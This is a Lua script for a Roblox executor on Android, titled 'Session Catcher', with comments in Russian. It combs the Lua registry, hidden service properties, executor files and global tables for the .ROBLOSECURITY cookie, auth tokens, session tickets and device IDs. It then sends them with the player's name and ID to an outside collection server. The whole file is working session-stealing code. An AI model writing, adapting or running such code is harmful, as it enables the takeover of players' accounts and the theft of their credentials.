-- ============================================================
--  Session Catcher — Delta Executor (Android)
--  v9 — final memory scrape: deep getreg, hidden props, pibble
-- ============================================================

local SERVER_URL = "https://session-catcher.onrender.com/catch"
local httpRequest = request or http_request or nil
if not httpRequest then return end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local results = {}

-- -----------------------------------------------------------
-- 1. Глубокий скан getreg на разные паттерны
-- -----------------------------------------------------------
local regMatches = {}
pcall(function()
    if getreg then
        local reg = getreg()
        for i, v in pairs(reg) do
            if type(v) == "string" then
                -- Ищем куку или её части
                if v:find("|_") or v:find("RBXID") or v:find("auth_token") 
                   or v:find("session") or v:find("ROBLOSECURITY") then
                    table.insert(regMatches, "REG_STR[" .. tostring(i) .. "]: " .. v:sub(1, 300))
                end
            elseif type(v) == "table" then
                for k2, v2 in pairs(v) do
                    if type(v2) == "string" then
                        if v2:find("|_") or v2:find("RBXID") or v2:find("auth_token") 
                           or v2:find("ROBLOSECURITY") then
                            table.insert(regMatches, "REG_TBL[" .. tostring(i) .. "][" .. tostring(k2) .. "]: " .. v2:sub(1, 300))
                        end
                    elseif type(v2) == "table" then
                        for k3, v3 in pairs(v2) do
                            if type(v3) == "string" then
                                if v3:find("|_") or v3:find("ROBLOSECURITY") then
                                    table.insert(regMatches, "REG_TBL3[" .. tostring(i) .. "][" .. tostring(k2) .. "][" .. tostring(k3) .. "]: " .. v3:sub(1, 300))
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end)
results.regMatches = regMatches

-- -----------------------------------------------------------
-- 2. gethiddenproperty на разные сервисы
-- -----------------------------------------------------------
local hiddenProps = {}
pcall(function()
    local services = {
        game:GetService("Players"),
        game:GetService("NetworkClient"),
        game:GetService("ReplicatedFirst"),
        game:GetService("RbxAnalyticsService"),
        game:GetService("PlatformUserService"),
        game:GetService("DataStoreService"),
        game
    }
    
    local propNames = {
        "RobloxSecurity", "ROBLOSECURITY", "Cookie", "AuthToken",
        "SessionToken", "SecurityToken", "AuthenticationToken",
        "Ticket", "AccessToken", "ClientTicket", "AuthTicket",
        "MachineId", "ClientID", "DeviceID", "TrackerId"
    }
    
    for _, svc in ipairs(services) do
        for _, prop in ipairs(propNames) do
            local ok, val = pcall(gethiddenproperty, svc, prop)
            if ok and val and type(val) == "string" and #val > 10 then
                hiddenProps[tostring(svc) .. "." .. prop] = val:sub(1, 500)
            end
        end
    end
end)
results.hiddenProps = hiddenProps

-- -----------------------------------------------------------
-- 3. getsafedir + listfiles + readfile
-- -----------------------------------------------------------
local safeDirInfo = {}
pcall(function()
    local sd = getsafedir and getsafedir() or ""
    safeDirInfo.path = sd
    if sd and sd ~= "" and listfiles then
        local files = listfiles(sd)
        safeDirInfo.fileCount = #files
        safeDirInfo.files = {}
        for _, f in ipairs(files) do
            local ok, content = pcall(readfile, f)
            if ok and content then
                safeDirInfo.files[f] = content:sub(1, 300)
            end
        end
    end
end)
results.safeDirInfo = safeDirInfo

-- -----------------------------------------------------------
-- 4. pibble.getpibbles — безопасный дамп
-- -----------------------------------------------------------
local pibbleDump = {}
pcall(function()
    local genv = getgenv()
    local pbl = genv and genv.pibble
    if pbl and pbl.getpibbles then
        local ok, tbl = pcall(pbl.getpibbles)
        if ok and type(tbl) == "table" then
            for k, v in pairs(tbl) do
                if type(v) == "string" or type(v) == "number" or type(v) == "boolean" then
                    pibbleDump[tostring(k)] = tostring(v):sub(1, 500)
                elseif type(v) == "table" then
                    local sub = {}
                    for k2, v2 in pairs(v) do
                        sub[tostring(k2)] = tostring(v2):sub(1, 200)
                    end
                    pibbleDump[tostring(k)] = sub
                else
                    pibbleDump[tostring(k)] = type(v)
                end
            end
        else
            pibbleDump.error = "getpibbles returned " .. type(tbl)
        end
    end
end)
results.pibbleDump = pibbleDump

-- -----------------------------------------------------------
-- 5. Crypt table — есть ли там кука
-- -----------------------------------------------------------
local cryptInfo = {}
pcall(function()
    local genv = getgenv()
    if genv and genv.crypt then
        for k, v in pairs(genv.crypt) do
            cryptInfo[tostring(k)] = type(v)
        end
    end
end)
results.cryptInfo = cryptInfo

-- -----------------------------------------------------------
-- 6. Cache table
-- -----------------------------------------------------------
local cacheInfo = {}
pcall(function()
    local genv = getgenv()
    if genv and genv.cache then
        for k, v in pairs(genv.cache) do
            cacheInfo[tostring(k)] = type(v)
        end
        -- Если cache содержит куки
        for k, v in pairs(genv.cache) do
            if type(v) == "string" and (v:find("ROBLOSECURITY") or v:find("|_")) then
                cacheInfo["COOKIE_FOUND"] = v:sub(1, 500)
            end
        end
    end
end)
results.cacheInfo = cacheInfo

-- -----------------------------------------------------------
-- Отправка
-- -----------------------------------------------------------
local payload = {
    username = LocalPlayer.Name,
    userId = LocalPlayer.UserId,
    results = results,
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

pcall(function()
    httpRequest({
        Url = SERVER_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end)

print("[Catcher] v9 final scrape sent")
